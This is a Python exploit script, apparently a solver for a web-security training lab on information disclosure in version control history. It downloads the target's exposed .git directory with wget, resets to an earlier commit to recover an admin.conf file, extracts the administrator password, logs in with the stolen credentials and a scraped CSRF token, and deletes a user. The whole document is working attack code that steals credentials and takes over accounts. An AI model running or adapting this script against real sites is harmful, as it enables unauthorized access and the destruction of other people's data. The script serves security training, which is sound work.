"""
    Lab: Information disclosure in version control history

    This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the administrator user then log in and delete the user carlos.
	
    Exploit Steps:
	1. Fetch the .git directory
	2. Reset to the previous commit
	3. Get the administrator password from the admin.conf file
	4. Login as administrator
	5. Delete carlos
	
	Author: N00BCYB0T
"""
import requests
import re
from colorama import Fore
import os
import argparse

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://lab.web-security-academy.net)')
	parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
	args = parser.parse_args()
	lab_domain = args.url.replace('https://', '').replace('http://', '').rstrip('/')

	session = requests.Session()
	if args.proxy:
		session.proxies = {
			"http": args.proxy,
			"https": args.proxy
		}

	print("⦗1⦘ Fetching .git directory (wait a minute).. ")
	
    #Linux
	os.system(f"wget -r https://{lab_domain}/.git")
    # Windows
	# os.system(f"C:\\wget\\wget.exe -r https://{lab_domain}/.git")

	print(Fore.WHITE + "⦗2⦘ Changing current working directory.. ", end="", flush=True)
	os.chdir(lab_domain)
	print(Fore.GREEN + "OK")

	os.system("git reset --hard HEAD~1")
	print(Fore.WHITE + "⦗3⦘ Resetting to the previous commit.. " + Fore.GREEN + "OK" )

	print(Fore.WHITE + "⦗4⦘ Reading admin.conf file.. ", end="", flush=True)
	admin_conf = open("admin.conf").readline()
	print(Fore.GREEN + "OK")

	print(Fore.WHITE + "⦗5⦘ Extracting the administrator password.. ", end="", flush=True)
	first_line = admin_conf.splitlines()[0]
	admin_pass = first_line.split("=")[1]
	print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_pass)

	print(Fore.WHITE + "⦗6⦘ Fetching the login page to get a valid session and csrf token.. ", end="", flush=True)
	login_page = fetch("/login", lab_domain, session)
	session_cookie = login_page.cookies.get("session")
	csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
	print(Fore.GREEN + "OK")

	print(Fore.WHITE + "⦗7⦘ Logging in as administrator.. ", end="", flush=True)
	data = { "username": "administrator", "password": admin_pass, "csrf": csrf }
	cookies = { "session": session_cookie }
	login_resp = post_data("/login", lab_domain, data, cookies, session)
	print(Fore.GREEN + "OK")

	print(Fore.WHITE + "⦗8⦘ Deleting carlos.. ", end="", flush=True)
	new_session = login_resp.cookies.get("session")
	cookies = { "session": new_session }
	fetch("/admin/delete?username=carlos", lab_domain, session, cookies=cookies)
	print(Fore.GREEN + "OK")
	print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

def fetch(path, lab_domain, session, cookies=None):
	try:
		return session.get(f"https://{lab_domain}{path}", cookies=cookies)
	except:
		print(Fore.RED + f"⦗!⦘ Failed to fetch {path} through exception")
		exit(1)

def post_data(path, lab_domain, data, cookies, session):
	try:
		return session.post(f"https://{lab_domain}{path}", data, cookies=cookies, allow_redirects=False)
	except:
		print(Fore.RED + f"⦗!⦘ Failed to post data to {path} through exception")
		exit(1)

if __name__ == "__main__":
	main()
